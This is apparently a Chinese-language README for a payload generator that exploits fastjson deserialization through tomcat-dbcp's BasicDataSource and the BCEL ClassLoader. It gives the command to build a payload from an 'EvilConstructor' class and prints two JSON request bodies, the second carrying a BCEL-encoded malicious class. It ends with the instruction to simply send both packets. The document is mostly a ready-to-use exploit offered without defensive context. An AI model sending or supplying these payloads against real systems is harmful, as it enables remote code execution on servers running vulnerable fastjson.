# BcelPayloadGenerator

该payload使用tomcat-dbcp中的BasicDataSource，无需另起ldap或者RMI也可以触发fastjson漏洞。

### 1.准备好EvilConstructor的.class文件，放在任意文件内

### 2.执行生成payload

命令：

```
java -cp BcelGenerator-1.0-SNAPSHOT-jar-with-dependencies.jar com.example.App [classpath] [classname]
classpath是EvilConstructor.class所在目录
classname是EvilConstructor.class具体的类的名字

Demo:
java -cp BcelGenerator-1.0-SNAPSHOT-jar-with-dependencies.jar com.example.App file:///D:/EvilConstructor.class EvilConstructor
```

### 3.生成Payload

第一个包：
```
{"name": 
	{
		"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"
	}
}
```

第二个包：

```
{"name":{"@type":"java.lang.Class","val":"org.apache.tomcat.dbcp.dbcp2.BasicData
Source"},"f":{"@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource", "driverCla
ssName": "org.apache.log4j.spi$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmR$cbN$db$40$U$3d$93$
b8vp$j$f2$80$d0$96$3e$80$bep$40$w$8b$$$a9$baAt$e5$3e$d4$m$ba$605$ZF$e9$d0$c4$8e$
s$T$c4$a2$ff$c3$9a$NT$5d$f4$D$faQm$cf$98$aa$m$g$5b$f7$5e$dd$c79s$ee$d8$3f$7f$7d$
ff$B$e0$r6b$d4p$3f$c6$D$3c$ac$e1$91$8f$x$RVc$dc$c2Z$84$c7$R$9e$I$84$afLn$dck$81j
$da$dd$X$Iv$8aC$z$d0$c8L$ae$dfMG$7dm$f7d$7f$c8J$3b$x$94$i$eeKk$7c$fe$b7$uh$9d$ec
H$k$cb$ad$a1$cc$H$5b$bb$tJ$8f$9d$v$f2m2$b9$cff$o$d0$cav$8f$cdp$a7$c8$t$ceN$95$x$
y$5b$f5$9e$93$ea$cb$5b9$$iJ$r$ab$E$8c$a4$c9$F$96$d2$83k$8c$3dgM$3e$d8$$$a5I$3b$m
$e1$c2$8c$b6$40$dc$x$a6V$e97$c6$cbZ$bcq$e4$L$PH0$878$c2$d3$E$cf$f0$9cl$dcF$rXGJ$
ca$Z$h$q$e8$o$e6E$dc$a0$Sh$5e$N$bf$ef$li$e5$b8$e3U$e9$e34wfD$N$f1$40$bb$7fI$t$ed
f$ff$cd$f8$3b$d2$tZ$J$ac$a736$beV$fa$60$L$a5$t$T$C$gc6$5dy$7d$7bV$w$8d5D$fc$c4$f
e$a9$40$f8$N$e9o3$fb$ca$bc$c2$b8$b4q$B$f1$N$95v$f5$i$c1$a7S$d4$b2$cds$84g$9c$KPG
$93$7fB$V$J$e7$96$R$d2$H$7cC$d6$e7$d8$89$d0$os$87$8cu$cfC$b6$W$bb$f3h$Q$eb$f3$ss
$a0Mk$a2$f2$9bNDX$f0n1$m$be$c3$89K$r$9b4$8f$Qg$a5H$7fXX$W$e6K$e2$e4$b2$89$3b$b8$
5b$c6$7b$e5$d4$f2$lp$8cf$3b$c3$C$A$A", "driverClassLoader":{"@type": "com.sun.or
g.apache.bcel.internal.util.ClassLoader"}}, "age":10}
```

发两个包过去就行了。
